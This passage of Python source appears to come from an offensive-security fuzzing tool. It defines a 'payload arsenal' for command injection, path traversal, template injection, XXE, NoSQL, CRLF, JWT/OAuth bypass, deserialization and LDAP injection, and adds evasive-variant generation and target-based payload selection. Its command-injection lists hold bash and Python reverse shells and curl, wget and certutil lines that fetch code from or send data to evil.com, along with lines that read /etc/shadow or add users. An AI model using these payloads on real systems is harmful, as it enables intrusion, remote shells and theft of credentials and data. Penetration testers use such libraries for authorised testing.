# ═══════════════════════════════════════════════════════════════════════


class CMDiPayloads:
    """Gerador de payloads de Command Injection."""

    CWE = "CWE-78"
    CVSS = 9.8

    LINUX = [
        ("; id", "Semicolon id"),
        ("| id", "Pipe id"),
        ("|| id", "OR id"),
        ("& id", "Background id"),
        ("&& id", "AND id"),
        ("`id`", "Backtick id"),
        ("$(id)", "Dollar paren id"),
        ("; cat /etc/passwd", "Read passwd"),
        ("| cat /etc/shadow", "Read shadow"),
        ("; whoami", "Whoami"),
        ("| uname -a", "System info"),
        ("; ls -la /", "Directory listing"),
        ("| find / -name '*.conf' 2>/dev/null", "Config file search"),
        ("; curl http://evil.com/$(whoami)", "OOB exfil curl"),
        ("| wget http://evil.com/$(hostname)", "OOB exfil wget"),
        ("; ping -c 3 evil.com", "Ping OOB"),
        ("$(curl http://evil.com/shell.sh|bash)", "Remote exec"),
        (
            '; python -c \'import socket,os;os.dup2(socket.create_connection(("evil.com",4444)).fileno(),0);os.dup2(0,1);os.dup2(0,2);os.execl("/bin/sh","sh")\'',
            "Python reverse shell",
        ),
        ("; bash -i >& /dev/tcp/evil.com/4444 0>&1", "Bash reverse shell"),
        ("\n id", "Newline command"),
        ("\r\n id", "CRLF command"),
        ("a]]; id", "Array close + command"),
        ("{{7*7}}", "Template injection test"),
    ]

    WINDOWS = [
        ("& whoami", "AND whoami"),
        ("| whoami", "Pipe whoami"),
        ("&& type C:\\windows\\win.ini", "Read win.ini"),
        ("| type C:\\windows\\system32\\drivers\\etc\\hosts", "Read hosts"),
        ("& dir C:\\", "Directory listing"),
        ("& net user", "List users"),
        ("& ipconfig /all", "Network config"),
        ("& systeminfo", "System info"),
        ("| tasklist", "Process list"),
        ("& net user hacked Passw0rd! /add", "Add user"),
        ("& powershell -enc ENCODED_PAYLOAD", "PowerShell encoded"),
        (
            "& certutil -urlcache -split -f http://evil.com/shell.exe C:\\temp\\shell.exe",
            "Certutil download",
        ),
    ]

    BLIND = [
        ("; sleep 5", "Linux sleep"),
        ("& timeout /T 5 /NOBREAK", "Windows timeout"),
        ("| ping -c 5 127.0.0.1", "Ping delay Linux"),
        ("& ping -n 5 127.0.0.1", "Ping delay Windows"),
        ("; curl http://BURP_COLLAB/", "OOB callback Linux"),
        ("& nslookup BURP_COLLAB", "OOB DNS Windows"),
        ("$(sleep 5)", "Subshell sleep"),
        ("`sleep 5`", "Backtick sleep"),
    ]

    @classmethod
    def all_payloads(cls) -> List[Payload]:
        result = []
        for payloads, subcat, platform in [
            (cls.LINUX, "linux", "linux"),
            (cls.WINDOWS, "windows", "windows"),
            (cls.BLIND, "blind", "generic"),
        ]:
            for raw, desc in payloads:
                result.append(
                    Payload(
                        raw=raw,
                        category=PayloadCategory.CMDI,
                        subcategory=subcat,
                        description=desc,
                        cwe=cls.CWE,
                        cvss_base=cls.CVSS,
                        platform=platform,
                        is_blind="blind" in subcat,
                        tags=[subcat],
                    )
                )
        return result


# ═══════════════════════════════════════════════════════════════════════
# PATH TRAVERSAL PAYLOADS
# ═══════════════════════════════════════════════════════════════════════


class PathTraversalPayloads:
    """Gerador de payloads de Path Traversal / LFI."""

    CWE = "CWE-22"
    CVSS = 7.5

    UNIX = [
        ("../../../etc/passwd", "Basic traversal"),
        ("....//....//....//etc/passwd", "Double dot bypass"),
        ("..%2f..%2f..%2fetc%2fpasswd", "URL encoded"),
        ("..%252f..%252f..%252fetc%252fpasswd", "Double encoded"),
        ("%2e%2e/%2e%2e/%2e%2e/etc/passwd", "Dot encoded"),
        ("..%c0%af..%c0%af..%c0%afetc/passwd", "UTF-8 overlong"),
        ("..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", "Unicode full-width slash"),
        ("....\\\\....\\\\....\\\\etc/passwd", "Backslash variant"),
        ("/etc/passwd", "Absolute path"),
        ("/etc/shadow", "Shadow file"),
        ("/proc/self/environ", "Proc environ"),
        ("/proc/self/cmdline", "Proc cmdline"),
        ("/proc/version", "Proc version"),
        ("/var/log/apache2/access.log", "Apache access log"),
        ("/var/log/auth.log", "Auth log"),
        ("php://filter/convert.base64-encode/resource=index.php", "PHP filter LFI"),
        ("php://input", "PHP input wrapper"),
        ("expect://id", "PHP expect wrapper"),
        (
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "PHP data wrapper RCE",
        ),
        ("/etc/passwd%00.jpg", "Null byte extension bypass"),
    ]

    WINDOWS = [
        ("..\\..\\..\\windows\\win.ini", "Backslash traversal"),
        ("..%5c..%5c..%5cwindows%5cwin.ini", "Encoded backslash"),
        ("....\\\\....\\\\windows\\win.ini", "Double backslash"),
        ("C:\\windows\\win.ini", "Absolute Windows"),
        ("C:\\windows\\system32\\drivers\\etc\\hosts", "Windows hosts"),
        ("C:\\boot.ini", "Boot.ini"),
        ("C:\\inetpub\\logs\\LogFiles\\", "IIS logs"),
        ("C:\\windows\\debug\\NetSetup.log", "NetSetup log"),
    ]

    @classmethod
    def all_payloads(cls) -> List[Payload]:
        result = []
        for payloads, subcat, platform in [
            (cls.UNIX, "unix", "linux"),
            (cls.WINDOWS, "windows", "windows"),
        ]:
            for raw, desc in payloads:
                result.append(
                    Payload(
                        raw=raw,
                        category=PayloadCategory.PATH_TRAVERSAL,
                        subcategory=subcat,
                        description=desc,
                        cwe=cls.CWE,
                        cvss_base=cls.CVSS,
                        platform=platform,
                        contexts=[InjectionContext.URL_PARAM, InjectionContext.PATH],
                        tags=[subcat],
                    )
                )
        return result


# ═══════════════════════════════════════════════════════════════════════
# SSTI (Server-Side Template Injection) PAYLOADS
# ═══════════════════════════════════════════════════════════════════════


class SSTIPayloads:
    """Gerador de payloads SSTI para multiplos template engines."""

    CWE = "CWE-1336"
    CVSS = 9.8

    DETECTION = [
        ("{{7*7}}", "Jinja2/Twig/Angular detection"),
        ("${7*7}", "Freemarker/Groovy/EL detection"),
        ("#{7*7}", "Ruby ERB detection"),
        ("<%= 7*7 %>", "ERB/EJS detection"),
        ("{{7*'7'}}", "Jinja2 vs Twig differentiation"),
        ("${7*7}", "Java EL detection"),
        ("${{7*7}}", "Thymeleaf detection"),
        ("{7*7}", "Velocity detection"),
        ("@(7*7)", "Razor detection"),
        ("[[${7*7}]]", "Thymeleaf inline"),
    ]

    JINJA2 = [
        ("{{config}}", "Config disclosure"),
        ("{{config.items()}}", "Config items"),
        (
            "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "Jinja2 RCE via builtins",
        ),
        (
            "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}"
            "{{c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\")}}{% endif %}{% endfor %}",
            "Jinja2 subclass RCE",
        ),
        ("{{''.__class__.__mro__[1].__subclasses__()}}", "Subclass enumeration"),
        (
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "Flask request RCE",
        ),
        ("{{lipsum.__globals__['os'].popen('id').read()}}", "Lipsum RCE"),
        ("{{cycler.__init__.__globals__.os.popen('id').read()}}", "Cycler RCE"),
    ]

    FREEMARKER = [
        (
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            "Freemarker Execute",
        ),
        ('${"freemarker.template.utility.Execute"?new()("id")}', "Freemarker inline"),
        (
            '[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}',
            "Freemarker alt syntax",
        ),
    ]

    TWIG = [
        (
            "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
            "Twig RCE (old)",
        ),
        ("{{['id']|filter('system')}}", "Twig filter system"),
        ("{{app.request.server.get('DOCUMENT_ROOT')}}", "Twig info disclosure"),
    ]

    JAVA_EL = [
        ("${Runtime.getRuntime().exec('id')}", "Java EL Runtime exec"),
        ("${T(java.lang.Runtime).getRuntime().exec('id')}", "Spring SpEL exec"),
        ("#{T(java.lang.Runtime).getRuntime().exec('id')}", "Spring SpEL alt"),
        ("*{T(java.lang.Runtime).getRuntime().exec('id')}", "Thymeleaf exec"),
    ]

    @classmethod
    def all_payloads(cls) -> List[Payload]:
        result = []
        for payloads, subcat in [
            (cls.DETECTION, "detection"),
            (cls.JINJA2, "jinja2"),
            (cls.FREEMARKER, "freemarker"),
            (cls.TWIG, "twig"),
            (cls.JAVA_EL, "java_el"),
        ]:
            for raw, desc in payloads:
                result.append(
                    Payload(
                        raw=raw,
                        category=PayloadCategory.SSTI,
                        subcategory=subcat,
                        description=desc,
                        cwe=cls.CWE,
                        cvss_base=cls.CVSS,
                        tags=[subcat],
                    )
                )
        return result


# ═══════════════════════════════════════════════════════════════════════
# XXE PAYLOADS
# ═══════════════════════════════════════════════════════════════════════


class XXEPayloads:
    """Gerador de payloads XML External Entity."""

    CWE = "CWE-611"
    CVSS = 7.5

    CLASSIC = [
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            "Classic file read",
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
            "Windows file read",
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
            "AWS SSRF via XXE",
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><root>&xxe;</root>',
            "Port scan via XXE",
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>',
            "PHP source code read",
        ),
    ]

    BLIND_OOB = [
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><root>test</root>',
            "Blind OOB DTD",
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd">'
            '<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;%send;]><root>test</root>',
            "Blind OOB with file exfil",
        ),
    ]

    PARAMETER = [
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % param1 "<!ENTITY xxe SYSTEM \'file:///etc/hostname\'>">%param1;]><root>&xxe;</root>',
            "Parameter entity",
        ),
        (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % a "file:///etc/passwd">'
            "<!ENTITY % b \"<!ENTITY &#37; c SYSTEM '%a;'>\">%b;%c;]><root>test</root>",
            "Nested parameter entities",
        ),
    ]

    XINCLUDE = [
        (
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
            "XInclude file read",
        ),
    ]

    SVG = [
        (
            '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
            '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
            "SVG XXE",
        ),
    ]

    XLSX = [
        (
            "xl/worksheets/sheet1.xml with XXE payload",
            "XLSX XXE (requires file upload)",
        ),
    ]

    @classmethod
    def all_payloads(cls) -> List[Payload]:
        result = []
        for payloads, subcat in [
            (cls.CLASSIC, "classic"),
            (cls.BLIND_OOB, "blind_oob"),
            (cls.PARAMETER, "parameter"),
            (cls.XINCLUDE, "xinclude"),
            (cls.SVG, "svg"),
            (cls.XLSX, "xlsx"),
        ]:
            for raw, desc in payloads:
                result.append(
                    Payload(
                        raw=raw,
                        category=PayloadCategory.XXE,
                        subcategory=subcat,
                        description=desc,
                        cwe=cls.CWE,
                        cvss_base=cls.CVSS,
                        contexts=[InjectionContext.XML_BODY],
                        tags=[subcat],
                    )
                )
        return result


# ═══════════════════════════════════════════════════════════════════════
# NOSQL INJECTION PAYLOADS
# ═══════════════════════════════════════════════════════════════════════


class NoSQLiPayloads:
    """Gerador de payloads NoSQL Injection (MongoDB, CouchDB)."""

    CWE = "CWE-943"
    CVSS = 9.1

    MONGODB = [
        ('{"$gt":""}', "Always true (JSON)"),
        ('{"$ne":null}', "Not equal null"),
        ('{"$regex":".*"}', "Regex match all"),
        ('{"$where":"1==1"}', "Where clause true"),
        ('{"$or":[{},{"username":"admin"}]}', "OR injection"),
        ('{"username":{"$gt":""},"password":{"$gt":""}}', "Auth bypass gt"),
        ('{"username":"admin","password":{"$ne":"wrong"}}', "Admin auth bypass"),
        ('{"$where":"this.password.match(/.*/)"}', "Regex match password"),
        ('{"$where":"sleep(5000)"}', "Time-based blind"),
        ("admin'||'1'=='1", "String injection OR"),
        ('{"$gt":"","$lt":"z"}', "Range bypass"),
        ('{"$regex":"^a","$options":"i"}', "Case-insensitive regex"),
        ('true, $or: [ {}, { "a":"a', "URL param injection"),
    ]

    COUCHDB = [
        ('{"selector":{"_id":{"$gt":null}}}', "CouchDB select all"),
        ('{"selector":{"username":{"$regex":".*"}}}', "CouchDB regex"),
    ]

    @classmethod
    def all_payloads(cls) -> List[Payload]:
        result = []
        for payloads, subcat in [
            (cls.MONGODB, "mongodb"),
            (cls.COUCHDB, "couchdb"),
        ]:
            for raw, desc in payloads:
                result.append(
                    Payload(
                        raw=raw,
                        category=PayloadCategory.NOSQLI,
                        subcategory=subcat,
                        description=desc,
                        cwe=cls.CWE,
                        cvss_base=cls.CVSS,
                        contexts=[
                            InjectionContext.JSON_BODY,
                            InjectionContext.URL_PARAM,
                        ],
                        tags=[subcat],
                    )
                )
        return result


# ═══════════════════════════════════════════════════════════════════════
# HEADER INJECTION / CRLF PAYLOADS
# ═══════════════════════════════════════════════════════════════════════


class HeaderInjectionPayloads:
    """Gerador de payloads de Header/CRLF Injection."""

    CWE = "CWE-113"
    CVSS = 6.1

    CRLF = [
        ("%0d%0aSet-Cookie:hacked=true", "CRLF Set-Cookie"),
        ("%0d%0aX-Injected:true", "CRLF custom header"),
        ("%0d%0a%0d%0a<script>alert(1)</script>", "CRLF + XSS body"),
        (
            "%0d%0aContent-Length:35%0d%0a%0d%0a<html>Defaced</html>",
            "CRLF HTTP response split",
        ),
        ("%0aSet-Cookie:hacked=true", "LF only Set-Cookie"),
        ("%0dSet-Cookie:hacked=true", "CR only Set-Cookie"),
        ("\\r\\nSet-Cookie:hacked=true", "Literal CRLF escape"),
        ("%E5%98%8A%E5%98%8DSet-Cookie:hacked=true", "Unicode CRLF bypass"),
        ("%0d%0aLocation:http://evil.com", "CRLF redirect"),
    ]

    HOST = [
        ("evil.com", "Host override"),
        ("evil.com:80", "Host with port"),
        ("127.0.0.1", "Host to localhost"),
        ("evil.com\r\nX-Injected:true", "Host + CRLF"),
    ]

    X_FORWARDED = [
        ("127.0.0.1", "XFF localhost"),
        ("127.0.0.1, 10.0.0.1", "XFF chain"),
        ("evil.com", "XFF domain"),
        ("::1", "XFF IPv6 loop"),
        ("127.0.0.1\r\nX-Injected:true", "XFF + CRLF"),
    ]

    @classmethod
    def all_payloads(cls) -> List[Payload]:
        result = []
        for payloads, subcat in [
            (cls.CRLF, "crlf"),
            (cls.HOST, "host"),
            (cls.X_FORWARDED, "xff"),
        ]:
            ctx = (
                InjectionContext.HEADER
                if subcat != "crlf"
                else InjectionContext.URL_PARAM
            )
            for raw, desc in payloads:
                result.append(
                    Payload(
                        raw=raw,
                        category=PayloadCategory.HEADER_INJECTION,
                        subcategory=subcat,
                        description=desc,
                        cwe=cls.CWE,
                        cvss_base=cls.CVSS,
                        contexts=[ctx],
                        tags=[subcat],
                    )
                )
        return result


# ═══════════════════════════════════════════════════════════════════════
# AUTH BYPASS PAYLOADS
# ═══════════════════════════════════════════════════════════════════════


class AuthBypassPayloads:
    """Payloads para bypass de autenticacao (JWT, OAuth, Session)."""

    CWE = "CWE-287"
    CVSS = 9.1

    JWT = [
        ('{"alg":"none","typ":"JWT"}', "Algorithm none attack"),
        ('{"alg":"HS256","typ":"JWT"}', "HS256 with known key"),
        ('{"alg":"RS256","typ":"JWT","kid":"../../dev/null"}', "KID path traversal"),
        (
            '{"alg":"RS256","typ":"JWT","kid":"key\' UNION SELECT \'secret\'--"}',
            "KID SQLi",
        ),
        (
            '{"alg":"RS256","typ":"JWT","jku":"http://evil.com/jwks.json"}',
            "JKU injection",
        ),
        (
            '{"alg":"RS256","typ":"JWT","x5u":"http://evil.com/cert.pem"}',
            "X5U injection",
        ),
        ('{"alg":"HS256","typ":"JWT"}', "RS256→HS256 confusion"),
    ]

    SESSION = [
        ("admin=true", "Admin cookie"),
        ("role=admin", "Role escalation"),
        ("user_id=1", "User ID manipulation"),
        ("is_superuser=1", "Superuser flag"),
        ("debug=1", "Debug mode"),
        ("access_level=9999", "Access level overflow"),
    ]

    OAUTH = [
        ("redirect_uri=http://evil.com/callback", "Redirect URI manipulation"),
        ("redirect_uri=http://legit.com@evil.com", "Authority confusion"),
        ("redirect_uri=http://legit.com%40evil.com", "Encoded authority"),
        ("scope=openid+profile+email+admin", "Scope escalation"),
        ("state=<script>alert(1)</script>", "State XSS"),
        ("response_type=code+token", "Response type confusion"),
    ]

    @classmethod
    def all_payloads(cls) -> List[Payload]:
        result = []
        for payloads, subcat in [
            (cls.JWT, "jwt"),
            (cls.SESSION, "session"),
            (cls.OAUTH, "oauth"),
        ]:
            ctx = (
                InjectionContext.HEADER if subcat == "jwt" else InjectionContext.COOKIE
            )
            for raw, desc in payloads:
                result.append(
                    Payload(
                        raw=raw,
                        category=PayloadCategory.AUTH_BYPASS,
                        subcategory=subcat,
                        description=desc,
                        cwe=cls.CWE,
                        cvss_base=cls.CVSS,
                        contexts=[ctx],
                        tags=[subcat, "auth"],
                    )
                )
        return result


# ═══════════════════════════════════════════════════════════════════════
# DESERIALIZATION PAYLOADS
# ═══════════════════════════════════════════════════════════════════════


class DeserializationPayloads:
    """Payloads para ataques de deserializacao insegura."""

    CWE = "CWE-502"
    CVSS = 9.8

    JAVA = [
        (
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
            "Java serialized HashMap (base64 fragment)",
        ),
        ("aced0005", "Java serialization magic bytes (hex)"),
        ("CommonsCollections1", "Ysoserial CommonsCollections1 gadget chain"),
        ("CommonsCollections5", "Ysoserial CommonsCollections5 gadget chain"),
        ("CommonsBeanutils1", "Ysoserial CommonsBeanutils1 gadget chain"),
        ("Spring1", "Ysoserial Spring1 gadget chain"),
        ("JRMPClient", "Ysoserial JRMP client gadget"),
    ]

    PYTHON = [
        ("cos\nsystem\n(S'id'\ntR.", "Python pickle RCE"),
        (
            'cbuiltins\neval\n(S\'__import__("os").system("id")\'\ntR.',
            "Pickle eval RCE",
        ),
        (
            "import pickle,os;pickle.loads(b\"cos\\nsystem\\n(S'id'\\ntR.\")",
            "Pickle loads demo",
        ),
        ("Y19yZWR1Y2VfZXhfXw==", "PyYAML unsafe_load marker"),
        ("!!python/object/apply:os.system ['id']", "PyYAML RCE"),
        ("!!python/object/new:subprocess.check_output [['id']]", "PyYAML subprocess"),
    ]

    PHP = [
        ('O:8:"stdClass":0:{}', "PHP stdClass"),
        ('a:1:{s:4:"test";s:5:"value";}', "PHP array"),
        (
            'O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}',
            "PHP object property manipulation",
        ),
        ("phar://./uploads/evil.phar", "Phar deserialization"),
        ('O:7:"Exploit":1:{s:3:"cmd";s:2:"id";}', "PHP magic method RCE"),
    ]

    DOTNET = [
        (
            '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework",'
            '"MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}',
            ".NET JSON TypeNameHandling",
        ),
        ("<root><type>System.Data.DataSet</type></root>", ".NET XML deserialization"),
        ("AAEAAAD/////", ".NET BinaryFormatter magic (base64 fragment)"),
    ]

    @classmethod
    def all_payloads(cls) -> List[Payload]:
        result = []
        for payloads, subcat in [
            (cls.JAVA, "java"),
            (cls.PYTHON, "python"),
            (cls.PHP, "php"),
            (cls.DOTNET, "dotnet"),
        ]:
            for raw, desc in payloads:
                result.append(
                    Payload(
                        raw=raw,
                        category=PayloadCategory.DESERIALIZATION,
                        subcategory=subcat,
                        description=desc,
                        cwe=cls.CWE,
                        cvss_base=cls.CVSS,
                        platform=subcat,
                        tags=[subcat, "rce"],
                    )
                )
        return result


# ═══════════════════════════════════════════════════════════════════════
# LDAP INJECTION PAYLOADS
# ═══════════════════════════════════════════════════════════════════════


class LDAPIPayloads:
    """Gerador de payloads LDAP Injection."""

    CWE = "CWE-90"
    CVSS = 7.5

    PAYLOADS = [
        ("*", "Wildcard match all"),
        ("*)(objectClass=*", "Always true filter"),
        ("*)(uid=*))(|(uid=*", "Filter bypass"),
        ("admin)(&)", "Admin AND bypass"),
        ("admin)(|(password=*)", "Password disclosure"),
        ("*)(cn=*", "CN wildcard"),
        ("*)(userPassword=*", "Password filter"),
        (")(objectClass=*)(objectClass=*", "Double filter"),
        ("admin)(!(&(1=0", "NOT AND bypass"),
        ("*))%00", "Null byte truncation"),
        ("*()|&'", "Special chars test"),
        ("admin)(|(objectClass=*", "OR injection"),
    ]

    @classmethod
    def all_payloads(cls) -> List[Payload]:
        return [
            Payload(
                raw=raw,
                category=PayloadCategory.LDAPI,
                subcategory="ldap",
                description=desc,
                cwe=cls.CWE,
                cvss_base=cls.CVSS,
                tags=["ldap"],
            )
            for raw, desc in cls.PAYLOADS
        ]


# ═══════════════════════════════════════════════════════════════════════
# MASTER PAYLOAD ARSENAL — Gerador unificado
# ═══════════════════════════════════════════════════════════════════════


class PayloadArsenal:
    """Arsenal unificado de todos os payloads do SIREN.

    Centraliza acesso a todos os geradores de payload com:
    - Filtragem por categoria, subcategoria, plataforma
    - Geracao de variantes evasivas em massa
    - Estatisticas do arsenal
    - Iterador lazy para uso em fuzzing
    """

    _GENERATORS = {
        PayloadCategory.SQLI: SQLiPayloads,
        PayloadCategory.XSS: XSSPayloads,
        PayloadCategory.SSRF: SSRFPayloads,
        PayloadCategory.CMDI: CMDiPayloads,
        PayloadCategory.PATH_TRAVERSAL: PathTraversalPayloads,
        PayloadCategory.SSTI: SSTIPayloads,
        PayloadCategory.XXE: XXEPayloads,
        PayloadCategory.NOSQLI: NoSQLiPayloads,
        PayloadCategory.HEADER_INJECTION: HeaderInjectionPayloads,
        PayloadCategory.AUTH_BYPASS: AuthBypassPayloads,
        PayloadCategory.DESERIALIZATION: DeserializationPayloads,
        PayloadCategory.LDAPI: LDAPIPayloads,
    }

    def __init__(self):
        self._cache: Dict[PayloadCategory, List[Payload]] = {}

    def get_payloads(self, category: PayloadCategory) -> List[Payload]:
        """Retorna payloads de uma categoria (cached)."""
        if category not in self._cache:
            gen = self._GENERATORS.get(category)
            if gen:
                self._cache[category] = gen.all_payloads()
            else:
                self._cache[category] = []
        return self._cache[category]

    def get_all(self) -> List[Payload]:
        """Retorna TODOS os payloads de todas as categorias."""
        result = []
        for cat in PayloadCategory:
            result.extend(self.get_payloads(cat))
        return result

    def get_by_subcategory(
        self, category: PayloadCategory, subcategory: str
    ) -> List[Payload]:
        """Filtra por subcategoria."""
        return [p for p in self.get_payloads(category) if p.subcategory == subcategory]

    def get_by_platform(self, platform: str) -> List[Payload]:
        """Filtra por plataforma (linux/windows/generic)."""
        return [p for p in self.get_all() if p.platform == platform]

    def get_by_tags(self, *tags: str) -> List[Payload]:
        """Filtra por tags (OR match)."""
        tag_set = set(tags)
        return [p for p in self.get_all() if tag_set & set(p.tags)]

    def get_blind_only(self) -> List[Payload]:
        """Retorna apenas payloads blind."""
        return [p for p in self.get_all() if p.is_blind]

    def get_time_based(self) -> List[Payload]:
        """Retorna payloads time-based."""
        return [p for p in self.get_all() if p.is_time_based]

    def generate_evasive(
        self, category: PayloadCategory, level: EvasionLevel = EvasionLevel.MEDIUM
    ) -> Generator[str, None, None]:
        """Gera payloads evasivos (lazy generator)."""
        for payload in self.get_payloads(category):
            for variant in PayloadEncoder.apply_evasion(payload.raw, level, category):
                yield variant

    def count(self, category: Optional[PayloadCategory] = None) -> int:
        """Conta payloads."""
        if category:
            return len(self.get_payloads(category))
        return len(self.get_all())

    def stats(self) -> Dict[str, Any]:
        """Estatisticas completas do arsenal."""
        all_p = self.get_all()
        by_cat = {}
        by_subcat = {}
        for p in all_p:
            by_cat[p.category.value] = by_cat.get(p.category.value, 0) + 1
            key = f"{p.category.value}/{p.subcategory}"
            by_subcat[key] = by_subcat.get(key, 0) + 1

        return {
            "total_payloads": len(all_p),
            "categories": len(by_cat),
            "subcategories": len(by_subcat),
            "by_category": by_cat,
            "by_subcategory": by_subcat,
            "blind_payloads": sum(1 for p in all_p if p.is_blind),
            "time_based_payloads": sum(1 for p in all_p if p.is_time_based),
            "unique_cwes": len(set(p.cwe for p in all_p if p.cwe)),
            "avg_cvss": round(sum(p.cvss_base for p in all_p) / max(len(all_p), 1), 1),
            "evasion_multiplier": "~5x per level",
        }

    def export_json(self) -> str:
        """Exporta todo o arsenal como JSON."""
        return json.dumps(
            [p.to_dict() for p in self.get_all()],
            indent=2,
            ensure_ascii=False,
        )

    def smart_select(self, target_tech: str, max_payloads: int = 50) -> List[Payload]:
        """Selecao inteligente de payloads baseada na tecnologia do target.

        Args:
            target_tech: stack detectada (ex: "php/mysql/apache")
            max_payloads: limite de payloads
        """
        tech = target_tech.lower()
        scores: List[Tuple[float, Payload]] = []

        for p in self.get_all():
            score = 1.0

            # Boost por tech match
            if "php" in tech:
                if p.subcategory in ("jinja2", "freemarker", "java_el"):
                    score *= 0.1
                if "php" in p.raw.lower() or p.subcategory == "php":
                    score *= 3.0
            elif "java" in tech or "spring" in tech:
                if "php" in p.raw.lower():
                    score *= 0.1
                if "java" in p.subcategory or p.platform == "java":
                    score *= 3.0
            elif "python" in tech or "django" in tech or "flask" in tech:
                if p.subcategory in ("jinja2", "python"):
                    score *= 3.0
            elif "node" in tech or "express" in tech:
                if p.subcategory in ("mongodb", "dom"):
                    score *= 3.0
            elif "asp" in tech or ".net" in tech:
                if p.subcategory == "dotnet" or "mssql" in p.description.lower():
                    score *= 3.0

            # DB match
            if "mysql" in tech and "mysql" in p.description.lower():
                score *= 2.0
            elif "postgres" in tech and (
                "pg" in p.description.lower() or "postgres" in p.description.lower()
            ):
                score *= 2.0
            elif "mongodb" in tech and p.subcategory == "mongodb":
                score *= 2.0

            # OS match
            if "linux" in tech and p.platform == "linux":
                score *= 1.5
            elif "windows" in tech and p.platform == "windows":
                score *= 1.5

            # CVSS weight
            score *= p.cvss_base / 10.0

            scores.append((score, p))

        scores.sort(key=lambda x: x[0], reverse=True)
        return [p for _, p in scores[:max_payloads]]


# ═══════════════════════════════════════════════════════════════════════
# CONVENIENCE — Global arsenal instance
# ═══════════════════════════════════════════════════════════════════════

ARSENAL = PayloadArsenal()


def get_payload_count() -> int:
    """Retorna total de payloads no arsenal."""
    return ARSENAL.count()


def get_payload_stats() -> Dict[str, Any]:
    """Retorna estatisticas do arsenal."""
    return ARSENAL.stats()
